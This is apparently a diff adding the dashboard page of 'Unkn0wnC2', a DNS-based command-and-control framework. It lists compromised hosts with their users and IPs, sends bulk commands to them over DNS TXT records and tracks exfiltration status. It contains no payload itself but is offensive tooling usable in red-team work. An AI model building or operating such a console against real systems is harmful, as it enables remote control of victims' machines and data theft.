@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="/static/logo.png">
+    <title>Dashboard - Unkn0wnC2</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=ITC+Benguiat:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/static/style.css">
+    <style>
+        .status-registering {
+            background: rgba(79, 195, 247, 0.08);
+            color: rgba(79, 195, 247, 0.8);
+            border-left-color: rgba(79, 195, 247, 0.5);
+        }
+
+        .selected-count {
+            color: #ff3333;
+            font-weight: 600;
+        }
+        .btn-bulk {
+            padding: 8px 16px;
+            background: rgba(255, 51, 51, 0.2);
+            border: 1px solid rgba(255, 51, 51, 0.4);
+            color: #ff3333;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 13px;
+            transition: all 0.2s;
+        }
+        .btn-bulk:hover {
+            background: rgba(255, 51, 51, 0.3);
+        }
+        .btn-bulk.btn-danger {
+            background: rgba(255, 0, 0, 0.2);
+            border-color: rgba(255, 0, 0, 0.4);
+            color: #ff4444;
+        }
+        .btn-bulk.btn-secondary {
+            background: rgba(100, 100, 100, 0.2);
+            border-color: rgba(100, 100, 100, 0.4);
+            color: #aaa;
+        }
+        .beacon-checkbox {
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <nav class="navbar">
+        <div class="navbar-brand">Unkn0wnC2</div>
+        <div class="navbar-right">
+            <div class="ws-status" id="wsStatus">
+                <div class="ws-status-dot"></div>
+                <span class="ws-status-text">Connecting...</span>
+            </div>
+            <div class="user-info">Logged in as <strong id="username">admin</strong></div>
+            <button class="btn-logout" onclick="logout()">Logout</button>
+        </div>
+    </nav>
+
+    <!-- Navigation Menu -->
+    <div class="nav-menu">
+        <a href="/dashboard" class="nav-btn active">Dashboard</a>
+        <a href="/builder" class="nav-btn">Builder</a>
+        <a href="/stager" class="nav-btn">Stager Sessions</a>
+        <a href="/exfils" class="nav-btn">Exfils</a>
+        <a href="/logs" class="nav-btn">Logs</a>
+        <a href="/report" class="nav-btn">Report</a>
+        <a href="/users" class="nav-btn" id="usersNavBtn">Users</a>
+    </div>
+
+    <div class="container">
+        <!-- Statistics -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="label">Active Beacons</div>
+                <div class="value" id="beaconCount">0</div>
+                <div class="subtitle">Connected clients</div>
+            </div>
+            <div class="stat-card">
+                <div class="label">DNS-Servers</div>
+                <div class="value" id="serverCount">0</div>
+                <div class="subtitle">DNS servers</div>
+            </div>
+            <div class="stat-card">
+                <div class="label">Pending Tasks</div>
+                <div class="value" id="taskCount">0</div>
+                <div class="subtitle">Queued commands</div>
+            </div>
+            <div class="stat-card">
+                <div class="label">Total Results</div>
+                <div class="value" id="resultCount">0</div>
+                <div class="subtitle">Completed tasks</div>
+            </div>
+        </div>
+
+        <!-- Beacons Table -->
+        <div class="section">
+            <div class="section-header">
+                <h2 class="section-title">Active Beacons</h2>
+                <button class="btn-refresh" onclick="loadBeacons()">↻ Refresh</button>
+            </div>
+            <div id="beaconsTable">
+                <div class="empty-state">
+                    <div class="empty-state-icon" id="beaconsEmptyIcon"></div>
+                    <div>No active beacons</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- DNS Servers Table -->
+        <div class="section">
+            <div class="section-header">
+                <h2 class="section-title">DNS-Servers</h2>
+                <button class="btn-refresh" onclick="loadServers()">↻ Refresh</button>
+            </div>
+            <div id="serversTable">
+                <div class="empty-state">
+                    <div class="empty-state-icon" id="serversEmptyIcon"></div>
+                    <div>No DNS-servers registered</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="/static/shared.js"></script>
+    <script>
+        const API_BASE = '';
+        document.querySelectorAll('#beaconsEmptyIcon, #serversEmptyIcon').forEach(el => { el.innerHTML = icons.listDashes; });
+
+        // Race condition guards
+        let isLoadingBeacons = false;
+        let isLoadingServers = false;
+
+        // Module-level beacon storage for client-side filtering
+        let allBeacons = [];
+
+        // Check authentication on page load
+        async function checkAuth() {
+            try {
+                const response = await authFetch('/api/stats');
+                if (!response || !response.ok) {
+                    window.location.href = '/login';
+                }
+            } catch (error) {
+                window.location.href = '/login';
+            }
+        }
+        checkAuth();
+
+        // Load dashboard data
+        async function loadDashboard() {
+            document.getElementById('loadingOverlay').classList.add('show');
+
+            try {
+                await Promise.all([
+                    loadBeacons(),
+                    loadServers(),
+                    loadStats()
+                ]);
+            } catch (error) {
+                console.error('Error loading dashboard:', error);
+            } finally {
+                document.getElementById('loadingOverlay').classList.remove('show');
+            }
+        }
+
+        // Render beacons table from a given array
+        function renderBeaconsTable(beacons) {
+            document.getElementById('beaconCount').textContent = allBeacons.length;
+
+            if (beacons.length === 0) {
+                document.getElementById('beaconsTable').innerHTML = `
+                    <div class="empty-state">
+                        <div class="empty-state-icon">${icons.listDashes}</div>
+                        <div>No active beacons</div>
+                    </div>`;
+                return;
+            }
+
+            const table = `
+                <input type="text" id="beaconSearch" placeholder="Filter by hostname, IP, user, OS..." style="width: 100%; padding: 10px 14px; margin-bottom: 15px; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,51,51,0.2); border-left: 3px solid rgba(255,51,51,0.4); color: #e0e0e0; font-size: 14px; border-radius: 0;">
+                <div id="bulkActionBar" class="bulk-action-bar">
+                    <span class="selected-count">0 selected</span>
+                    <button class="btn-bulk" onclick="bulkSendCommand()">Send Command</button>
+                    <button class="btn-bulk btn-danger" onclick="bulkDeleteBeacons()">Delete Selected</button>
+                    <button class="btn-bulk btn-secondary" onclick="clearBulkSelection()">Clear Selection</button>
+                </div>
+                <table class="table" id="beaconsTableEl">
+                    <thead>
+                        <tr>
+                            <th><input type="checkbox" id="selectAllBeacons" onchange="toggleAllBeacons(this)"></th>
+                            <th>ID</th>
+                            <th>Name</th>
+                            <th>Hostname</th>
+                            <th>User</th>
+                            <th>OS</th>
+                            <th>IP Address</th>
+                            <th>Build</th>
+                            <th>Last Seen</th>
+                            <th>Status</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        ${beacons.map(beacon => `
+                            <tr data-beacon-id="${escapeHtml(beacon.id)}" data-beacon-hostname="${escapeHtml(beacon.hostname)}">
+                                <td><input type="checkbox" class="beacon-checkbox" value="${escapeHtml(beacon.id)}" onchange="updateBulkSelection()" ${selectedBeacons.has(beacon.id) ? 'checked' : ''}></td>
+                                <td><code>${escapeHtml(beacon.id)}</code></td>
+                                <td>${beacon.beacon_name ? escapeHtml(beacon.beacon_name) : '<span style="color:#555">-</span>'}</td>
+                                <td>${beacon.hostname ? escapeHtml(beacon.hostname) : '<span style="color:#555">-</span>'}</td>
+                                <td>${beacon.username ? escapeHtml(beacon.username) : '<span style="color:#555">-</span>'}</td>
+                                <td>${beacon.os ? escapeHtml(beacon.os) : '<span style="color:#555">-</span>'}</td>
+                                <td>${escapeHtml(beacon.ip_address)}</td>
+                                <td>${beacon.build_id ? `<code style="color:#0f0;font-size:11px">${escapeHtml(beacon.build_id)}</code>` : '<span style="color:#555">-</span>'}</td>
+                                <td>${formatTimestamp(beacon.last_seen)}</td>
+                                <td>${(() => {
+                                    if (beacon.status === 'exfiltrating') return '<span class="status-badge status-exfiltrating">Exfiltrating</span>';
+                                    if (beacon.registration_stage != null && beacon.registration_stage < 3) return '<span class="status-badge status-registering">Registering ' + beacon.registration_stage + '/3</span>';
+                                    if (isOnline(beacon.last_seen)) return '<span class="status-badge status-online">Online</span>';
+                                    return '<span class="status-badge status-offline">Offline</span>';
+                                })()}</td>
+                                <td><button class="btn-manage" data-action="manage">Manage</button></td>
+                            </tr>
+                        `).join('')}
+                    </tbody>
+                </table>`;
+
+            document.getElementById('beaconsTable').innerHTML = table;
+
+            // Re-trigger bulk selection UI if items were previously selected
+            if (selectedBeacons.size > 0) {
+                const actionBar = document.getElementById('bulkActionBar');
+                const countEl = actionBar.querySelector('.selected-count');
+                actionBar.classList.add('show');
+                countEl.textContent = `${selectedBeacons.size} selected`;
+            }
+
+            // Wire up search input with debounce
+            const searchInput = document.getElementById('beaconSearch');
+            if (searchInput) {
+                searchInput.addEventListener('input', debounce(function() {
+                    const query = searchInput.value.toLowerCase().trim();
+                    if (!query) {
+                        renderBeaconsTable(allBeacons);
+                        return;
+                    }
+                    const filtered = allBeacons.filter(b =>
+                        (b.hostname || '').toLowerCase().includes(query) ||
+                        (b.ip_address || '').toLowerCase().includes(query) ||
+                        (b.username || '').toLowerCase().includes(query) ||
+                        (b.os || '').toLowerCase().includes(query) ||
+                        (b.id || '').toLowerCase().includes(query)
+                    );
+                    // Re-render table body only, keep search value
+                    const savedQuery = searchInput.value;
+                    renderBeaconsTable(filtered);
+                    const newInput = document.getElementById('beaconSearch');
+                    if (newInput) {
+                        newInput.value = savedQuery;
+                        newInput.focus();
+                    }
+                }, 300));
+            }
+
+            // Event delegation for manage buttons and delete buttons
+            const tableEl = document.getElementById('beaconsTableEl');
+            if (tableEl) {
+                tableEl.addEventListener('click', function(e) {
+                    const manageBtn = e.target.closest('[data-action="manage"]');
+                    if (manageBtn) {
+                        const row = manageBtn.closest('tr[data-beacon-id]');
+                        if (row) {
+                            manageBeacon(row.dataset.beaconId, row.dataset.beaconHostname);
+                        }
+                    }
+                });
+            }
+        }
+
+        // Load beacons
+        async function loadBeacons() {
+            if (isLoadingBeacons) return;
+            isLoadingBeacons = true;
+            try {
+                const response = await authFetch('/api/beacons');
+                if (!response) return;
+
+                const data = await response.json();
+                allBeacons = data.beacons || [];
+
+                renderBeaconsTable(allBeacons);
+            } catch (error) {
+                console.error('Error loading beacons:', error);
+            } finally {
+                isLoadingBeacons = false;
+            }
+        }
+
+        // Load DNS servers
+        async function loadServers() {
+            if (isLoadingServers) return;
+            isLoadingServers = true;
+            try {
+                const response = await authFetch('/api/dns-servers');
+                if (!response) return;
+
+                const data = await response.json();
+                const servers = data.servers || [];
+
+                document.getElementById('serverCount').textContent = servers.length;
+
+                if (servers.length === 0) {
+                    document.getElementById('serversTable').innerHTML = `
+                        <div class="empty-state">
+                            <div class="empty-state-icon">${icons.listDashes}</div>
+                            <div>No DNS servers registered</div>
+                        </div>`;
+                    return;
+                }
+
+                const table = `
+                    <table class="table">
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Domain</th>
+                                <th>Address</th>
+                                <th>Last Checkin</th>
+                                <th>Status</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            ${servers.map(server => `
+                                <tr>
+                                    <td><code>${escapeHtml(server.id)}</code></td>
+                                    <td>${escapeHtml(server.domain || 'N/A')}</td>
+                                    <td>${escapeHtml(server.address || 'N/A')}</td>
+                                    <td>${formatTimestamp(server.last_checkin)}</td>
+                                    <td><span class="status-badge ${isOnline(server.last_checkin) ? 'status-online' : 'status-offline'}">${isOnline(server.last_checkin) ? 'Online' : 'Offline'}</span></td>
+                                </tr>
+                            `).join('')}
+                        </tbody>
+                    </table>`;
+
+                document.getElementById('serversTable').innerHTML = table;
+            } catch (error) {
+                console.error('Error loading servers:', error);
+            } finally {
+                isLoadingServers = false;
+            }
+        }
+
+        // Load statistics
+        async function loadStats() {
+            try {
+                const response = await authFetch('/api/stats');
+                if (!response) return;
+                
+                const stats = await response.json();
+                
+                const tasksByStatus = stats.tasks_by_status || {};
+                const pendingTasks = (tasksByStatus['pending'] || 0) + (tasksByStatus['sent'] || 0) + (tasksByStatus['exfiltrating'] || 0);
+                document.getElementById('taskCount').textContent = pendingTasks;
+
+                const completedTasks = tasksByStatus['completed'] || 0;
+                document.getElementById('resultCount').textContent = completedTasks;
+                
+                // Log task status breakdown for operators
+                if (tasksByStatus && Object.keys(tasksByStatus).length > 0) {
+                    console.log('[Dashboard] Task Status:', tasksByStatus);
+                }
+            } catch (error) {
+                console.error('[Dashboard] Error loading stats:', error);
+                document.getElementById('taskCount').textContent = 'N/A';
+                document.getElementById('resultCount').textContent = 'N/A';
+            }
+        }
+
+        // Note: formatTimestamp, isOnline, and logout are now in shared.js
+
+        function manageBeacon(beaconId, hostname) {
+            // Navigate to beacon management page
+            window.location.href = `/beacon?id=${beaconId}&hostname=${encodeURIComponent(hostname)}`;
+        }
+
+        // Initial load
+        loadDashboard();
+
+        // WebSocket handlers for real-time updates
+        ws.on('beacon_update', (beacon) => {
+            loadBeacons();
+        });
+
+        ws.on('dns_server_update', (server) => {
+            loadServers();
+        });
+
+        ws.on('task_update', (task) => {
+            loadStats();
+        });
+
+        // Fallback auto-refresh only when WebSocket is disconnected
+        setInterval(() => {
+            if (!ws || !ws.isConnected) {
+                loadBeacons();
+                loadServers();
+                loadStats();
+            }
+        }, 30000);
+
+        // Bulk operations functions
+        let selectedBeacons = new Set();
+
+        function toggleAllBeacons(checkbox) {
+            const checkboxes = document.querySelectorAll('.beacon-checkbox');
+            checkboxes.forEach(cb => {
+                cb.checked = checkbox.checked;
+                if (checkbox.checked) {
+                    selectedBeacons.add(cb.value);
+                } else {
+                    selectedBeacons.delete(cb.value);
+                }
+            });
+            updateBulkSelection();
+        }
+
+        function updateBulkSelection() {
+            const checkboxes = document.querySelectorAll('.beacon-checkbox:checked');
+            selectedBeacons.clear();
+            checkboxes.forEach(cb => selectedBeacons.add(cb.value));
+            
+            const actionBar = document.getElementById('bulkActionBar');
+            const countEl = actionBar.querySelector('.selected-count');
+            
+            if (selectedBeacons.size > 0) {
+                actionBar.classList.add('show');
+                countEl.textContent = `${selectedBeacons.size} selected`;
+            } else {
+                actionBar.classList.remove('show');
+            }
+        }
+
+        function clearBulkSelection() {
+            selectedBeacons.clear();
+            document.querySelectorAll('.beacon-checkbox, #selectAllBeacons').forEach(cb => cb.checked = false);
+            document.getElementById('bulkActionBar').classList.remove('show');
+        }
+
+        async function bulkSendCommand() {
+            if (selectedBeacons.size === 0) {
+                showToast('No beacons selected', 'warning');
+                return;
+            }
+            
+            const command = prompt(`Enter command to send to ${selectedBeacons.size} beacon(s) (max 180 chars):`);
+            if (!command) return;
+
+            if (command.length > 180) {
+                showToast(`Command too long: ${command.length}/180 characters. DNS TXT records have size limits.`, 'error');
+                return;
+            }
+
+            showLoading();
+            try {
+                const response = await authFetch('/api/beacons/bulk/task', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        beacon_ids: Array.from(selectedBeacons),
+                        command: command
+                    })
+                });
+                
+                if (response && response.ok) {
+                    const data = await response.json();
+                    showToast(`Command sent to ${data.success_count || selectedBeacons.size} beacon(s)`, 'success');
+                    clearBulkSelection();
+                } else if (response) {
+                    const errData = await response.json().catch(() => ({}));
+                    showToast(errData.error || `Failed to send bulk command (${response.status})`, 'error');
+                } else {
+                    showToast('Failed to send bulk command', 'error');
+                }
+            } catch (error) {
+                console.error('Bulk command error:', error);
+                showToast('Error sending bulk command', 'error');
+            } finally {
+                hideLoading();
+            }
+        }
+
+        async function bulkDeleteBeacons() {
+            if (selectedBeacons.size === 0) {
+                showToast('No beacons selected', 'warning');
+                return;
+            }
+            
+            if (!confirm(`Delete ${selectedBeacons.size} beacon(s)? This cannot be undone.`)) {
+                return;
+            }
+
+            showLoading();
+            let successCount = 0;
+            for (const beaconId of selectedBeacons) {
+                try {
+                    const response = await authFetch(`/api/beacons/${beaconId}`, { method: 'DELETE' });
+                    if (response && response.ok) successCount++;
+                } catch (e) {
+                    console.error(`Failed to delete beacon ${beaconId}:`, e);
+                }
+            }
+            hideLoading();
+            
+            showToast(`Deleted ${successCount}/${selectedBeacons.size} beacon(s)`, successCount > 0 ? 'success' : 'error');
+            clearBulkSelection();
+            loadBeacons();
+        }
+    </script>
+</body>
+</html>
